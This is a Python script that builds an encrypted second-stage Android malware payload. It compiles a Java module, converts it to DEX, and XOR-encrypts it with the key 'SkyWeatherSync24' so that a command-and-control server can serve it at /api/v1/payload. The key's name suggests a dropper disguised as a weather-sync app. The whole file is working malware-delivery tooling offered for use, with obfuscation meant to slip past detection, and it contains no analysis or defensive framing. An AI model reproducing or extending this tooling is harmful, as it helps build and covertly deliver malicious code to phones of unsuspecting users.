#!/usr/bin/env python3
"""
Build + encrypt the Stage 2 payload.

Pipeline:
  1. javac Module.java → Module.class
  2. d8 Module.class → classes.dex
  3. XOR-encrypt classes.dex → payload.enc

Output: out/payload.enc (served by C2 at GET /api/v1/payload)

Usage:
  python scripts/build-payload.py

Requires:
  - javac on PATH (JDK)
  - d8 from Android SDK build-tools
"""

import os
import sys
import subprocess
import shutil

# Configuration
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_DIR = os.path.dirname(SCRIPT_DIR)
SRC_DIR = os.path.join(PROJECT_DIR, "src")
OUT_DIR = os.path.join(PROJECT_DIR, "out")
XOR_KEY = b"SkyWeatherSync24"  # Must match AppConfig.PAYLOAD_KEY

# Android SDK path
ANDROID_SDK = os.environ.get("ANDROID_HOME",
    os.path.expanduser(r"~\AppData\Local\Android\Sdk"))
BUILD_TOOLS = os.path.join(ANDROID_SDK, "build-tools")


def find_d8():
    """Find the latest d8 tool in Android SDK build-tools."""
    if not os.path.exists(BUILD_TOOLS):
        print(f"ERROR: build-tools not found at {BUILD_TOOLS}")
        sys.exit(1)

    versions = sorted(os.listdir(BUILD_TOOLS), reverse=True)
    for ver in versions:
        # Try d8.bat (Windows) or d8 (Linux/Mac)
        for name in ["d8.bat", "d8"]:
            d8_path = os.path.join(BUILD_TOOLS, ver, name)
            if os.path.exists(d8_path):
                return d8_path

    print("ERROR: d8 not found in any build-tools version")
    sys.exit(1)


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt/decrypt with rotating key."""
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def main():
    os.makedirs(OUT_DIR, exist_ok=True)
    class_dir = os.path.join(OUT_DIR, "classes")
    os.makedirs(class_dir, exist_ok=True)

    print("=" * 60)
    print("Stage 2 Payload Builder")
    print("=" * 60)

    # Step 1: Compile Java → .class
    print("\n[1/3] Compiling Module.java...")
    java_file = os.path.join(SRC_DIR, "Module.java")
    result = subprocess.run(
        ["javac", "-source", "17", "-target", "17",
         "-d", class_dir, java_file],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        print(f"javac failed:\n{result.stderr}")
        sys.exit(1)

    class_file = os.path.join(class_dir, "payload", "Module.class")
    print(f"  -> {class_file} ({os.path.getsize(class_file)} bytes)")

    # Step 2: Convert .class → .dex
    print("\n[2/3] Converting to DEX...")
    d8 = find_d8()
    dex_output = os.path.join(OUT_DIR, "classes.dex")

    result = subprocess.run(
        [d8, "--output", OUT_DIR, class_file],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        print(f"d8 failed:\n{result.stderr}")
        sys.exit(1)

    dex_size = os.path.getsize(dex_output)
    print(f"  -> {dex_output} ({dex_size} bytes)")

    # Verify DEX magic
    with open(dex_output, "rb") as f:
        magic = f.read(4)
        assert magic[:3] == b"dex", f"Invalid DEX magic: {magic}"
    print(f"  -> DEX magic verified: {magic}")

    # Step 3: XOR encrypt
    print("\n[3/3] XOR encrypting with key '{}'...".format(XOR_KEY.decode()))
    with open(dex_output, "rb") as f:
        dex_bytes = f.read()

    encrypted = xor_encrypt(dex_bytes, XOR_KEY)
    enc_output = os.path.join(OUT_DIR, "payload.enc")
    with open(enc_output, "wb") as f:
        f.write(encrypted)

    print(f"  -> {enc_output} ({len(encrypted)} bytes)")

    # Verify roundtrip
    decrypted = xor_encrypt(encrypted, XOR_KEY)
    assert decrypted[:3] == b"dex", "Roundtrip verification FAILED"
    assert decrypted == dex_bytes, "Roundtrip data mismatch"
    print("  -> Roundtrip verification: OK")

    # Summary
    print("\n" + "=" * 60)
    print("BUILD SUCCESSFUL")
    print(f"  Payload DEX:       {dex_size} bytes")
    print(f"  Encrypted payload: {len(encrypted)} bytes")
    print(f"  XOR key:           {XOR_KEY.decode()}")
    print(f"  Output:            {enc_output}")
    print(f"\n  Copy to C2 server directory or configure C2 to serve from:")
    print(f"    {enc_output}")
    print("=" * 60)

    # Cleanup intermediate files
    shutil.rmtree(class_dir, ignore_errors=True)


if __name__ == "__main__":
    main()
